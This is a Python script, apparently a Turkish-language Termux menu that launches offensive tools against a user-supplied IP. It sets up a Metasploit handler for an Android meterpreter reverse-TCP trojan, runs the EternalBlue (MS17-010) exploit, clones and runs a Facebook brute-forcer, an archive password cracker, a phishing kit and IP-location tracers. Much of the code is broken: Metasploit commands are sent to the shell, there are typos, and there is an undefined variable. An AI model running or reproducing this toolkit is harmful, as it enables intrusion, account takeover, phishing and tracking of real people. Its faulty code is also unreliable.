import os
import io
os.system("clear")
banner=("""   \033[1;31m,__,\033[1;m        ______ _     _
 |  _ \      |  ____(_)   | |
 | |_) |_   _| |__   _ ___| |__   ___ _ __
 |  _ <| | | |  __| | / __| '_ \ / _ \ '__|
 | |_) | |_| | |    | \__ \ | | |  __/ |
 |____/ \__, |_|    |_|___/_| |_|\___|_|
         __/ |
        |___/ """)
sec=("""'\033[93m
1-Port tarama
2-Pentest
3-Metasploiti aç
4-Trojanı dinlemeye alma
5-ms17 açığını istismar etme
6-Ağ trafiği görüntüleme
7-Dosya Gönderme
8-FaceBook Bruteforce
9-Rar-Zip crackle
10-FaceBook bilgi toplama aracı
11-Karşcihazda sistem zafiyeti taraması yapma
12-İp'den Detaylı bilgi analizi
13-dnsmaq indir
14-tor'u çalıştır
15-İp'ni öğrenme
16-Phising
17-nokta atışı konum bulma
99-Çıkış""")
print(banner)
ip=input("ip------->")
print(sec)
girdi=input("------------->")
if girdi == "1":
        banner2=("""'\033[92mPORT TARAMASI""")
        k=("""
        1-Nmap kur
        2-Zaten kurulu""")
        print(banner2)
        print(k)
        nm=input("------------------>")
        if nm=="1":
        	os.system("pkg install nmap")
        if nm=="2":
       	 os.system("nmap -sV"+ip)
if girdi == "2":
        banner3=("""PENTEST""")
        kn=("""
        1-Nmap kur
        2-Zaten kurulu""")
        print(kn)
        knc=input("------------------>")
        if knc=="1":
        	os.system("pkg install nmap")
        if knc=="2":
        	os.system("nmap -Pn "+ip)
if girdi == "3":
        banner4=("""metasploit""")
        mk=input("metasploit kurmak istermisiniz?----->Y/N(eğer bu program sizde kuruluysa n yi seçiniz)")
        if mk=="y":
                os.system("pkg install metasploit")
        os.system("msfconsole")
        if mk=="Y":
                os.system("pkg install metasploit")
        os.system("msfconsole")
        if mk=="n":
        	os.system("msfconsole")
        if mk=="N":
        	os.system("msfconsole")
if girdi == "4":
        banner4=("""'\033[94mTROJANI DİNLEMEYE AL"""
        )
        print("Metasploit kurulumu?")
        msfs=input("------------------------->")
        if msfs=="y":
        	print(banner4)
        	port=input("port adresi--------->")
        	os.system("msfconsole")
        	os.system("use exploit/multi/handler")
        	os.system("set payload android meterpreter/reverse_tcp")
        	os.system("set lhost"+ip)
        	os.system("set lport"+port)
        	os.system("run")
        if msfs=="Y":
        	print(banner4)
        	port=input("port adresi--------->")
        	os.system("msfconsole")
        	os.system("use exploit/multi/handler")
        	os.system("set payload android meterpreter/reverse_tcp")
        	os.system("set lhost"+ip)
        	os.system("set lport"+port)
        	os.system("run")
        if msfs=="n":
        	os.system("pkg install metasploit")
        	os.system("clear")
        if msfs=="N":
        	os.system("pkg install metasploit")
        	os.system("clear")
if girdi == "5":
        banner5=("""MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMM                MMMMMMMMMM
MMMN$                           vMMMM
MMMNl  MMMMM             MMMMM  JMMMM
MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM                             MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
MMMMR  ?MMNM             MMMMM .dMMMM
MMMMNm `?MMM             MMMM` dMMMMM
MMMMMMN  ?MM             MM?  NMMMMMN
MMMMMMMMNe                 JMMMMMNMMM
MMMMMMMMMMNm,            eMMMMMNMMNMM
MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM""")
        print(banner5)
        os.system("msfconsole")
        os.system("use exploit/windows/smb/ms17_010_eternalblue")
        os.sytem("RHOST"+ip)
if girdi =="6":
        os.system("netstat ?")
if girdi =="7":
        dosya=input("dosya adı---------->")
        git=input("gideceği yer-------------->")
        os.system("cp "+dosya+"/data/data/com.termux/files/home/ "+git)
if girdi=="8":
        print("Blue-Force sizde yüklümü?")
        bfs=input("------------------->")
        if bfs=="n":
        	os.system("git clone https://github.com/AngelSecurityTeam/BluForce-FB")
        	os.system("cd BluForce-FB")
        	os.system("python2 blueforcefb.py")
        if bfs=="N":
        	os.system("git clone https://github.com/AngelSecurityTeam/BluForce-FB")
        	os.system("cd BluForcr-FB")
        	os.system("python2 blueforcefb.py")
        	
if girdi=="9":
        os.system("git clone https://github.com/ByCh4n/Rar-Zip-Crack")
        os.system("cd Rar-Zip-Crack")
        os.system("python3 rar_zip_cracker.py")
if girdi=="10":
        print("OSIF aracını indir y/n")
        sor=input("-------------------->")
        if sor=="y":
        	os.system("git clone https://github.com/CiKu370/OSIF")
        	os.system("pip2 install requirements.txt")
        if sor=="n":
        	os.system("cd OSIF")
        	print("gerekli dosyaları kur y/n")
        	kr=input("---------------------->")
        if sor=="N":
        	os.system("cd OSIF")
        	print("gerekli dosyaları kur y/n")
        	kr=input("---------------------->")
        	if kr=="y":
        		os.system("pip2 install requirements.txt")
        		os.system("clear")
        		os.system("python2 osif.py")
        		ths.write("token")
        		ths.close()
        	if kr=="n":
        		os.system("cd OSIF")
        		os.system("clear")
        		os.system("python2 osif.py")
        		ths.write("token")
        		ths.close()
if girdi=="11":
        indr=input("nmap'i indir(y/n)-------->")
        if indr=="y":
        	os.system("pkg install nmap")
        if indr=="Y":
        	os.system("pkg install nmap")
        if indr=="n":
            os.system("nmap -vv -sS --script "+ip)
            os.system("nmap -sS --script "+ip)
if girdi=="12":
        banner13=("""_       ____  ______  _________
| |     / / / / / __ \/  _/ ___/
| | /| / / /_/ / / / // / \__ \
| |/ |/ / __  / /_/ _/ / ___/ /
|__/|__/_/ /_/\____/___//____/
      """)
        print(banner13)
        os.system("git clone https://github.com/Manisso/Crips.git")
        os.system("cd Crips")
        os.system("python2 crips.py")
        os.system("1")
        os.system(ip)
if girdi=="13":
        os.system("apt-get install dnsmap")
if girdi=="14":
        os.system("tor")
if girdi=="15":
        os.system("ifconfig")
if girdi=="16":
	print("Turk-Sploit yüklümü")
	sr=input("----------------->")
	if sr=="y":
		os.system("cd Turk-Sploit")
		print("gerekli dosyalar kurulsunmu?")
		gr=input("------------->")
	if sr=="Y":
		os.system("cd Turk-Sploit")
		print("gerekli dosyalar kurulsunmu?")
		gr=input("------------->")
		if gr=="y":
			os.system("bash requtements.sh")
			os.system("clear")
			print("Gerekli dosyalar kuruldu!!!!")
		if gr=="Y":
			os.system("bash requtements.sh")
			os.system("clear")
			print("Gerekli dosyalar kuruldu!!!!")
		if gr=="n":
			os.system("cd Turk-Sploit")
			os.system("bash tst.sh")
		if gr=="N":
			os.system("cd Turk-Sploit")
			os.system("bash tst.sh")
	if sr=="n":
		os.system("git clone https://github.com/yamanefkar/Turk-Sploit")
		os.system("cd Turk-Sploit")
		os.system("bash requarements.sh")
		os.system("bash tst.sh")
	if sr=="N":
		os.system("git clone https://github.com/yamanefkar/Turk-Sploit")
		os.system("cd Turk-Sploit")
		os.system("bash requarements.sh")
		os.system("bash tst.sh")
if girdi=="17":
	nk=("""
	1-Ip-Tracer'ı indir
	2-Zaten kurulu""")
	print(nk)
	nka=input("--------------------->")
	if nka=="1":
		os.system("git clone https://github.com/IP-Tracer/IP-Tracer")
	if nka=="2":
		os.system("cd IP-Tracer")
		os.system("python2 ip-tracer.py " +ip)
if girdi=="99":
        os.system("ctrl-c")
